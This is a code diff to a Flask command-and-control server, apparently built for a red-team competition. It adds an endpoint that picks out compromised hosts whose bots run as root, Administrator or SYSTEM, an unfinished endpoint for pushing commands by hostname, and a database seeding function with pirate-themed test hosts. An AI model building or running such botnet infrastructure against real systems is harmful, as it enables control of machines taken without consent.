@@ -14,6 +14,7 @@ from models import Bot
 from models import Command
 from models import db 
 from models import User 
+from sqlalchemy import or_
 
 """
 Name: server.py 
@@ -44,6 +45,8 @@ PORT = app.config.get("PORT")
 FIRSTCONTACTKEY = app.config.get("FIRSTCONTACTKEY")
 REGISTERKEY = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for _ in range(16))
 MASTERKEY = app.config.get("MASTERKEY")
+
+PRIVILEGED_USERS = ['root','Administrator','SYSTEM','captain','firstmate','stowaway']
 
 # Agent timer 
 TIMER = 40
@@ -225,6 +228,49 @@ def register():
         ## 'botid':bot.id
         return jsonify({'result': 'success', 'botid': bot.id})
 
+@app.route('/bot/find', methods=['POST'])
+def findhost():
+    # Error checking  
+    error = posterrorcheck(request, 'masterkey', 'hostname')
+    if error is not True:
+        return error 
+
+    data = request.form 
+    hostname = data['hostname']
+
+    query_bot_list = Bot.query.filter_by(os=hostname).filter(or_(Bot.user.like('%Administrator%'),Bot.user.like('%SYSTEM'),Bot.user.in_(PRIVILEGED_USERS))).all()
+
+    jsonbot_list = []
+
+    # Only unique, single instance (ipaddress) list of bots. 
+    # ex) What if 10.1.1.2 has 10 bots running as root? We don't want to send same command to all 10 bots. 
+    # set has to be used, as this is a list of objects, and we only want "ip" attribute of the object to be unique 
+    seen = set()
+    jsonbot_list = []
+    for bot in query_bot_list:
+        if bot.ip not in seen:
+            jsonbot_list.append(bot.jsonbot())
+            seen.add(bot.ip)
+
+    return Response(json.dumps(jsonbot_list), mimetype='application/json')
+
+@app.route('/bot/hostname/push', methods=['POST'])
+def hostnamepush():
+    # Error checking  
+    error = posterrorcheck(request, 'masterkey', 'cmd', 'hostname')
+    if error is not True:
+        return error 
+
+    # POST parameter parsing 
+    data = request.form
+    masterkey = data['masterkey']
+    cmd = data['cmd']
+    hostnmame = data['hostname']
+
+    try:
+        query_bot_list = Bot.query.filter_by()
+    except Exception as e:
+        return jsonify({'error':str(e)})
 
 @app.route('/bot/<target>/push', methods=['POST'])
 def botpush(target):
@@ -633,6 +679,30 @@ def updatepwnboard():
 # ========================= Flask App Starts =========================
 
 
+def test_db():
+    bot_ip = ['10.1.1.2', '10.1.1.3', '10.1.1.4', '10.1.1.5', '10.1.1.6', '10.1.1.7', '10.1.1.8', '10.2.1.2', '10.2.1.3', '10.2.1.4', '10.2.1.5', '10.2.1.6', '10.2.1.7', '10.2.1.8', '10.3.1.2', '10.3.1.3', '10.3.1.4', '10.3.1.5', '10.3.1.6', '10.3.1.7', '10.3.1.8', '10.4.1.2', '10.4.1.3', '10.4.1.4', '10.4.1.5', '10.4.1.6', '10.4.1.7', '10.4.1.8', '10.5.1.2', '10.5.1.3', '10.5.1.4', '10.5.1.5', '10.5.1.6', '10.5.1.7', '10.5.1.8', '10.6.1.2', '10.6.1.3', '10.6.1.4', '10.6.1.5', '10.6.1.6', '10.6.1.7', '10.6.1.8', '10.7.1.2', '10.7.1.3', '10.7.1.4', '10.7.1.5', '10.7.1.6', '10.7.1.7', '10.7.1.8', '10.8.1.2', '10.8.1.3', '10.8.1.4', '10.8.1.5', '10.8.1.6', '10.8.1.7', '10.8.1.8', '10.9.1.2', '10.9.1.3', '10.9.1.4', '10.9.1.5', '10.9.1.6', '10.9.1.7', '10.9.1.8', '10.10.1.2', '10.10.1.3', '10.10.1.4', '10.10.1.5', '10.10.1.6', '10.10.1.7', '10.10.1.8']
+    hostname = ['annebonny', 'williamkidd', 'calicojack', 'maryread', 'edwardteach', 'captaincrapo', 'canoot', 'nemo', 'gunner', 'laurellabonaire', 'lockelamora', 'hook']
+    bot_user = ['root','blackteam','Administrator','joe','NT Authority\SYSTEM']
+    bot_pid = '5000'
+
+    counter = 0
+    idx = 0
+    for ip in bot_ip:
+        counter += 1
+        if counter % 8 == 0:
+            idx += 1
+        bot = Bot(ip, hostname[idx], bot_user[random.randint(0,len(bot_user)-1)], random.randint(100,20000))
+        db.session.add(bot)
+        db.session.commit()
+    
+    bot = Bot('10.1.1.2', 'annebonny', 'root', random.randint(100,20000))
+    db.session.add(bot)
+    bot = Bot('10.1.1.2', 'annebonny', 'root', random.randint(100,20000))
+    db.session.add(bot)
+    bot = Bot('10.1.1.2', 'annebonny', 'root', random.randint(100,20000))
+    db.session.add(bot)
+    db.session.commit()
+
 def init_db():
     db.drop_all()
     db.create_all()
@@ -640,6 +710,9 @@ def init_db():
     master.set_password(MASTERPASSWORD)
     db.session.add(master)
     db.session.commit()
+
+    # DEBUGGING PURPOSES 
+    #test_db()
 
 
 init_db()
